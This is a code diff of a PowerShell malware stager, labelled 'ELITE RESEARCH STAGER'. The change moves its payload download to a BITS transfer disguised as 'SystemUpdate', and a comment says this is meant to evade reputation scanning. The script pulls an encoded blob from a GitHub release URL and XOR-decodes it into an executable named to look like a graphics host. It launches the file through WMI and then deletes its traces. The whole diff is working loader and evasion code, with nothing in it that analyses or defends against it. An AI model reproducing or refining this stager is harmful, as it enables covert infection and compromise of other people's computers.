@@ -1,4 +1,4 @@
-# --- [ELITE RESEARCH STAGER v29.3: PRO STABLE + TELEGRAM BYPASS] ---
+# --- [ELITE RESEARCH STAGER v29.3: STEALTH BITS + TELEGRAM BYPASS] ---
 
 function Global-Initialize {
     try {
@@ -33,12 +33,18 @@ try {
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
     $path = Join-Path $dir "D3D11Host.exe"
 
-    $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
+    # --- STEALTH DOWNLOAD METHOD ---
+    # Using BITS Transfer instead of WebClient to bypass Reputation Scan
+    $source = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $temp = "$env:TEMP\data.tmp"
+    Import-Module BitsTransfer
+    Start-BitsTransfer -Source $source -Destination $temp -DisplayName "SystemUpdate" -Priority High
+    
+    $raw = Get-Content $temp -Raw
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
+    Remove-Item $temp -Force
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
